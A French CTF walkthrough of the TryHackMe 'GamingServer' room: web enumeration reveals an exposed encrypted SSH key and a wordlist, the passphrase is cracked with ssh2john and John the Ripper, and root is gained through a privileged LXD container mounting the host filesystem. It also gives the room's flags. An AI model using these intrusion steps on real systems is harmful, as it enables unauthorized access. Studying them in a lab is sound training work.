---
tags:
  - Linux
  - TryHackMe
  - Facile
  - Nmap
  - Gobuster
  - SSH
  - John the Ripper
  - LXD
---

# GamingServer - TryHackMe

<figure markdown>
  ![GamingServer](./logo/gamingserver.png){ width="250" }
</figure>

## Informations générales

| | |
|---|---|
| **Plateforme** | TryHackMe |
| **Type** | Offensive / Walkthrough |
| **Difficulté** | Facile |
| **Thématiques** | Énumération web, crackage de clé SSH, escalade via LXD |
| **Prérequis** | Bases Linux, HTTP, SSH, John the Ripper, conteneurs LXC/LXD |

## Contexte et objectifs

Cette room propose de compromettre un serveur de jeu mal configuré. Le chemin d'exploitation passe par de l'énumération web pour découvrir une clé SSH protégée par une passphrase, le crackage de cette passphrase avec une wordlist trouvée sur le serveur, et une escalade de privilèges via l'appartenance au groupe `lxd`.

!!! info "À propos de cette room"
    GamingServer est une room d'initiation efficace qui couvre des réflexes d'énumération essentiels (code source HTML, robots.txt, fuzzing de répertoires) avant d'introduire le crackage de clé SSH. L'escalade via LXD, bien que plus rare que Docker, est un classique des CTF Linux : être membre du groupe `lxd` équivaut à être root.

## Méthodologie

### Étape 1 : Cartographie des services avec Nmap

On commence par identifier les services exposés sur la machine cible.

```bash
nmap -sC -sV <IP_cible>
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_bMv4sCpKZ9.png)](./screen/GamingServer/WindowsTerminal_bMv4sCpKZ9.png)

Deux ports ouverts :

- **22/tcp** : SSH (OpenSSH 7.6p1, Ubuntu)
- **80/tcp** : HTTP (Apache 2.4.29)

Seulement deux services exposés, la surface d'attaque est réduite. Le SSH n'étant pas attaquable sans credentials, on se tourne vers le port 80.

### Étape 2 : Énumération web et découverte des répertoires cachés

Le service HTTP étant le seul point d'entrée exploitable pour l'instant, on visite `http://<IP_cible>` dans le navigateur.

[![GamingServer](./screen/GamingServer/msrdc_86j8PSCSUq.png)](./screen/GamingServer/msrdc_86j8PSCSUq.png)

La page affiche un site minimal intitulé "House of Danak", sans contenu interactif visible. Avant de lancer un fuzzing de répertoires, un réflexe d'énumération souvent négligé : on inspecte le code source HTML de la page.

[![GamingServer](./screen/GamingServer/msrdc_5pJXuE3NRm.png)](./screen/GamingServer/msrdc_5pJXuE3NRm.png)

Le code source contient un commentaire HTML révélateur :

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

Un premier nom d'utilisateur est découvert : **john**. On ne sait pas encore à quel service il est destiné, mais le port 22 (SSH) étant ouvert, c'est une piste à conserver.

On vérifie également le fichier `robots.txt`, un autre réflexe d'énumération web :

[![GamingServer](./screen/GamingServer/msrdc_7KMMPyX6jo.png)](./screen/GamingServer/msrdc_7KMMPyX6jo.png)

```
user-agent: *
Allow: /
/uploads/
```

La present de `/uploads/` dans ce fichier expose un répertoire que le créateur du site ne souhaitait probablement pas indexer.

On complète cette énumération passive par du fuzzing de répertoires avec Gobuster, qui teste mécaniquement une liste de noms de chemins courants :

```bash
gobuster dir -u http://<IP_cible> -w /usr/share/wordlists/dirb/common.txt
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_hdsoDEboAG.png)](./screen/GamingServer/WindowsTerminal_hdsoDEboAG.png)

Gobuster découvre deux répertoires accessibles : `/secret/` et `/uploads/`. On a maintenant deux chemins à visiter.

Le répertoire `/secret/` contient un unique fichier nommé `secretKey` :

[![GamingServer](./screen/GamingServer/msrdc_oV3RdiqUXI.png)](./screen/GamingServer/msrdc_oV3RdiqUXI.png)

On le télécharge et on l'examine :

```bash
wget http://<IP_cible>/secret/secretKey
cat secretKey
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_rbwAXkrKaU.png)](./screen/GamingServer/WindowsTerminal_rbwAXkrKaU.png)

Le fichier est une clé privée RSA, reconnaissable à l'en-tête `-----BEGIN RSA PRIVATE KEY-----`. La ligne `Proc-Type: 4,ENCRYPTED` et `DEK-Info: AES-128-CBC` indique qu'elle est protégée par une passphrase. On ne peut pas l'utiliser pour se connecter en SSH directement : il faut d'abord casser cette passphrase. Avant de s'y attaquer, il reste un répertoire à explorer.

Le répertoire `/uploads/`, découvert via `robots.txt`, contient trois fichiers :

[![GamingServer](./screen/GamingServer/msrdc_5w1bP5Iv1z.png)](./screen/GamingServer/msrdc_5w1bP5Iv1z.png)

On les télécharge tous pour les examiner :

```bash
wget http://<IP_cible>/uploads/dict.lst
wget http://<IP_cible>/uploads/manifesto.txt
wget http://<IP_cible>/uploads/meme.jpg
```

- `manifesto.txt` : un texte sans intérêt pour la compromission
- `meme.jpg` : une image sans données cachées exploitables
- `dict.lst` : une liste de mots de passe, comportant un mot par ligne

[![GamingServer](./screen/GamingServer/WindowsTerminal_WfPF8sW2t0.png)](./screen/GamingServer/WindowsTerminal_WfPF8sW2t0.png)

`dict.lst` est le fichier le plus intéressant : c'est une wordlist sur mesure, vraisemblablement placée là comme indice par le créateur de la room. Sa présence sur le même serveur que `secretKey` suggère fortement qu'elle contient la passphrase de la clé.

### Étape 3 : Crackage de la passphrase de la clé SSH

Avec la clé chiffrée et la wordlist en main, on dispose de tout ce qu'il faut pour tenter de casser la passphrase. L'outil `ssh2john` convertit une clé privée SSH en un format de hash que John the Ripper peut attaquer :

```bash
ssh2john secretKey > hash.txt
```

!!! info "Que fait ssh2john ?"
    `ssh2john` extrait les informations cryptographiques de la clé privée SSH (sel, vecteur d'initialisation, données chiffrées) et les encode dans un format que John the Ripper comprend. Ce n'est pas un "crackage" direct : il prépare le fichier pour que John puisse tester des passphrases candidates en boucle.

On lance John avec `dict.lst` comme wordlist :

```bash
john --wordlist=dict.lst hash.txt
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_KauJNs9zBW.png)](./screen/GamingServer/WindowsTerminal_KauJNs9zBW.png)

John trouve la passphrase en quelques secondes : **`letmein`**.

### Étape 4 : Connexion SSH et flag utilisateur

La passphrase de la clé étant maintenant connue, on peut l'utiliser pour se connecter en SSH. Le nom d'utilisateur `john`, découvert dans le commentaire HTML à l'étape 2, est le candidat évident.

Avant toute connexion, il faut restreindre les permissions de la clé, sans quoi SSH refuse de l'utiliser pour des raisons de sécurité :

```bash
chmod 600 secretKey
ssh -i secretKey john@<IP_cible>
```

Lorsque le prompt demande la passphrase, on saisit `letmein`.

[![GamingServer](./screen/GamingServer/WindowsTerminal_mpOGOaTHFs.png)](./screen/GamingServer/WindowsTerminal_mpOGOaTHFs.png)

La connexion aboutit, confirmant que `john` est bien le propriétaire de la clé et que `letmein` est la bonne passphrase.

La session SSH stable établie, on récupère le flag utilisateur dans le répertoire personnel de john :

```bash
cat /home/john/user.txt
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_uz0jRd9prf.png)](./screen/GamingServer/WindowsTerminal_uz0jRd9prf.png)

!!! success "Réponse"
    **What is the user flag?** → `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

### Étape 5 : Escalade de privilèges via le groupe LXD

Le flag utilisateur obtenu, on passe à l'élévation de privilèges. La première vérification à faire sur toute machine Linux est de regarder les groupes de l'utilisateur courant : certaines appartenances (docker, lxd, disk, sudo) sont des vecteurs d'escalade immédiats.

```bash
id
```

[![GamingServer](./screen/GamingServer/t2b632A8WR.png)](./screen/GamingServer/t2b632A8WR.png)

La sortie révèle que john est membre du groupe **lxd** (`108(lxd)`). C'est un vecteur d'escalade bien documenté : tout membre du groupe `lxd` peut créer et gérer des conteneurs LXC. En créant un conteneur privilégié avec le système de fichiers hôte monté à l'intérieur, on obtient un accès root complet à la machine.

!!! info "Qu'est-ce que LXD et pourquoi est-ce dangereux ?"
    LXD est un gestionnaire de conteneurs Linux qui fonctionne comme une couche au-dessus de LXC. Par défaut, seuls les membres du groupe `lxd` peuvent interagir avec le démon LXD. Le problème est qu'un conteneur LXC configuré en mode `security.privileged=true` et avec le système de fichiers hôte monté dedans ne fournit aucune isolation réelle : l'utilisateur root dans le conteneur est mappé au root de l'hôte, et le point de montage donne accès à tous les fichiers du système. Monter `/` dans un conteneur privilégié équivaut à ouvrir une session root sur l'hôte.

L'exploitation se déroule en deux temps : construire une image Alpine sur notre machine d'attaque, puis la transférer et l'exécuter sur la cible.

**Sur la machine d'attaque**, on clone le dépôt `lxd-alpine-builder` et on construit l'image :

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo bash build-alpine
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_2ET0Wt9Yxk.png)](./screen/GamingServer/WindowsTerminal_2ET0Wt9Yxk.png)

Le script produit une archive `alpine-v3.13-x86_64-<timestamp>.tar.gz`. On la rend accessible via un serveur HTTP Python :

```bash
sudo python3 -m http.server 80
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_VJXkmaVy5U.png)](./screen/GamingServer/WindowsTerminal_VJXkmaVy5U.png)

**Sur la cible**, on télécharge l'image dans `/tmp`, un des rares répertoires où john a les droits d'écriture :

```bash
cd /tmp
wget http://<VOTRE_IP>/alpine-v3.13-x86_64-*.tar.gz
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_rg6wP0q9lL.png)](./screen/GamingServer/WindowsTerminal_rg6wP0q9lL.png)

On importe l'image dans LXD, on crée un conteneur privilégié et on y monte la racine du système hôte :

```bash
lxc image import alpine-v3.13-x86_64-*.tar.gz --alias privesc
lxc init privesc ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_3UiMvbsWmj.png)](./screen/GamingServer/WindowsTerminal_3UiMvbsWmj.png)

!!! tip "Décryptage des commandes LXD"
    - `lxc image import` : enregistre l'image Alpine sous l'alias `privesc`
    - `lxc init privesc ignite -c security.privileged=true` : crée un conteneur nommé `ignite` à partir de l'image, en mode privilégié (le root du conteneur est le root de l'hôte)
    - `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true` : ajoute un périphérique de type `disk` au conteneur. `source=/` monte la racine de l'hôte, `path=/mnt/root` définit l'emplacement dans le conteneur, `recursive=true` inclut tous les sous-répertoires et points de montage
    - `lxc start ignite` : démarre le conteneur
    - `lxc exec ignite /bin/sh` : exécute un shell dans le conteneur

À l'intérieur du conteneur, on est root. Le système de fichiers de l'hôte est accessible via `/mnt/root`. On lit le flag root :

```bash
cat /mnt/root/root/root.txt
```

[![GamingServer](./screen/GamingServer/WindowsTerminal_U0kOeX6B2J.png)](./screen/GamingServer/WindowsTerminal_U0kOeX6B2J.png)

!!! success "Réponse"
    **What is the root flag?** → `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

## Synthèse technique

| Catégorie | Détails |
|-----------|---------|
| **Vulnérabilités identifiées** | Clé SSH privée exposée dans `/secret/`, wordlist de crackage disponible dans `/uploads/`, appartenance au groupe `lxd` |
| **Techniques utilisées** | Énumération web (code source, robots.txt, fuzzing), crackage de passphrase SSH, escalade de privilèges par conteneur LXD privilégié |
| **Outils employés** | Nmap, Gobuster, ssh2john, John the Ripper, LXD, lxd-alpine-builder |

!!! abstract "Ce qu'il faut retenir"
    1. Le code source HTML, `robots.txt` et le fuzzing de répertoires sont les trois premiers réflexes d'énumération web. Un commentaire de développeur dans le code source ("john, please add content...") peut révéler un nom d'utilisateur valide.
    2. Une wordlist trouvée sur un serveur (`dict.lst`) est toujours à tester en priorité avant des wordlists génériques comme `rockyou.txt`. Le créateur de la room l'a placée intentionnellement.
    3. L'appartenance au groupe `lxd` est un vecteur d'escalade immédiat : un conteneur privilégié avec le système de fichiers hôte monté donne un accès root complet, sans aucune restriction.
    4. Une clé SSH protégée par une passphrase n'est pas inutilisable : `ssh2john` + une bonne wordlist permet de la casser si la passphrase est faible.
